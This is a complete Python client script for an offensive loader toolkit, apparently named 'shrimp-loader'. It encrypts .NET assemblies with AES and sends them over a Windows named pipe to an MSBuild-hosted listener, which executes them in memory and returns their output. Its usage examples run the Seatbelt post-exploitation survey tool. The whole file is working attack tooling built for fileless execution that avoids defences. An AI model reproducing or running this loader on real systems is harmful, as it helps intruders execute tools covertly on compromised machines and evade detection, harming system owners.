#!/usr/bin/env python3
"""
Named Pipe Client -- sends .NET assemblies to the pipe listener for in-memory execution.

Usage:
  python pipe_client.py <pipe_name> <assembly_path> [options] [-- <assembly_args>...]
  python pipe_client.py <pipe_name> --quit

Protocol (matches msbuild_listener.csproj):
  Send: [4B assembly_len][encrypted_bytes][4B argc][string args...][string typeName][string methodName]
  Recv: [string output][4B exit_code]
  Quit: [4B 0x00000000]
  String = [4B len][UTF-8 bytes]

Examples:
  python pipe_client.py shrimploader Seatbelt.exe --key <hex> --iv <hex> -- -group=all
  python pipe_client.py shrimploader MyLib.dll --key <hex> --iv <hex> --type NS.Class --method Run
  python pipe_client.py shrimploader --quit
"""

import argparse
import os
import struct
import sys


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
    except ImportError:
        print("[-] AES encryption requires the 'cryptography' package.", file=sys.stderr)
        print("    Install with: pip install cryptography", file=sys.stderr)
        sys.exit(1)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def connect_pipe(pipe_path):
    """Connect to a named pipe, returns (handle, write_fn, read_fn, close_fn)."""
    try:
        import win32file
        handle = win32file.CreateFile(
            pipe_path,
            win32file.GENERIC_READ | win32file.GENERIC_WRITE,
            0, None,
            win32file.OPEN_EXISTING,
            0, None
        )

        def write_bytes(data):
            win32file.WriteFile(handle, data)

        def read_bytes(n):
            _, data = win32file.ReadFile(handle, n)
            return data

        def close():
            win32file.CloseHandle(handle)

        return handle, write_bytes, read_bytes, close

    except ImportError:
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        GENERIC_READ = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 3
        INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

        handle = kernel32.CreateFileW(
            pipe_path, GENERIC_READ | GENERIC_WRITE,
            0, None, OPEN_EXISTING, 0, None
        )
        if handle == INVALID_HANDLE_VALUE:
            return None, None, None, None

        def write_bytes(data):
            written = wintypes.DWORD()
            kernel32.WriteFile(handle, data, len(data), ctypes.byref(written), None)

        def read_bytes(n):
            buf = ctypes.create_string_buffer(n)
            read = wintypes.DWORD()
            kernel32.ReadFile(handle, buf, n, ctypes.byref(read), None)
            return buf.raw[:read.value]

        def close():
            kernel32.CloseHandle(handle)

        return handle, write_bytes, read_bytes, close


def write_int32(write_fn, val):
    write_fn(struct.pack("<i", val))


def write_string(write_fn, s):
    data = s.encode("utf-8")
    write_int32(write_fn, len(data))
    if data:
        write_fn(data)


def read_int32(read_fn):
    return struct.unpack("<i", read_fn(4))[0]


def read_string(read_fn):
    length = read_int32(read_fn)
    if length == 0:
        return ""
    return read_fn(length).decode("utf-8", errors="replace")


def send_quit(pipe_name):
    """Send quit sentinel (assembly_len == 0) to shut down the listener."""
    pipe_path = rf"\\.\pipe\{pipe_name}"
    handle, write_fn, _, close_fn = connect_pipe(pipe_path)
    if handle is None:
        print(f"[-] Cannot connect to pipe: {pipe_name}", file=sys.stderr)
        return 1

    write_int32(write_fn, 0)
    close_fn()
    print(f"[+] Quit signal sent to pipe: {pipe_name}", file=sys.stderr)
    return 0


def send_assembly(pipe_name, assembly_path, key, iv, args, type_name="", method_name=""):
    """Encrypt and send an assembly to the pipe listener, receive output."""
    with open(assembly_path, "rb") as f:
        assembly_bytes = f.read()

    print(f"[*] Assembly: {assembly_path} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    encrypted = aes_encrypt(assembly_bytes, key, iv)
    print(f"[*] Encrypted: {len(encrypted)} bytes", file=sys.stderr)

    pipe_path = rf"\\.\pipe\{pipe_name}"
    handle, write_fn, read_fn, close_fn = connect_pipe(pipe_path)
    if handle is None:
        print(f"[-] Cannot connect to pipe: {pipe_name}", file=sys.stderr)
        return 1

    # Send encrypted assembly
    write_int32(write_fn, len(encrypted))
    write_fn(encrypted)

    # Send args
    write_int32(write_fn, len(args))
    for arg in args:
        write_string(write_fn, arg)

    # Send type/method (empty string = use EntryPoint)
    write_string(write_fn, type_name)
    write_string(write_fn, method_name)

    # Receive output
    output = read_string(read_fn)
    exit_code = read_int32(read_fn)

    if output:
        print(output, end="")
    print(f"[*] Exit code: {exit_code}", file=sys.stderr)

    close_fn()
    return exit_code


def main():
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Send .NET assemblies to the shrimp-loader pipe listener"
    )
    parser.add_argument("pipe_name", help="Named pipe name (e.g. shrimploader)")
    parser.add_argument("assembly", nargs="?", help="Path to .NET assembly")
    parser.add_argument("--key", required=False, help="AES-256 key as hex (64 chars)")
    parser.add_argument("--iv", required=False, help="AES IV as hex (32 chars)")
    parser.add_argument("--type", help="Type name for DLL invocation (e.g. Namespace.Class)")
    parser.add_argument("--method", help="Method name for DLL invocation (e.g. Execute)")
    parser.add_argument("--quit", action="store_true", help="Send quit signal to listener")
    args = parser.parse_args(argv)

    if args.quit:
        sys.exit(send_quit(args.pipe_name))

    if not args.assembly:
        parser.error("assembly is required (unless using --quit)")

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)

    if not args.key or not args.iv:
        print("[-] --key and --iv are required (use values from build_msbuild.py output)",
              file=sys.stderr)
        sys.exit(1)

    key = bytes.fromhex(args.key)
    iv = bytes.fromhex(args.iv)

    if len(key) != 32:
        print(f"[-] AES-256 key must be 32 bytes (64 hex chars), got {len(key)}", file=sys.stderr)
        sys.exit(1)
    if len(iv) != 16:
        print(f"[-] AES IV must be 16 bytes (32 hex chars), got {len(iv)}", file=sys.stderr)
        sys.exit(1)

    if (args.type is None) != (args.method is None):
        print("[-] --type and --method must be specified together.", file=sys.stderr)
        sys.exit(1)

    exit_code = send_assembly(
        args.pipe_name,
        args.assembly,
        key, iv,
        assembly_args,
        type_name=args.type or "",
        method_name=args.method or "",
    )
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
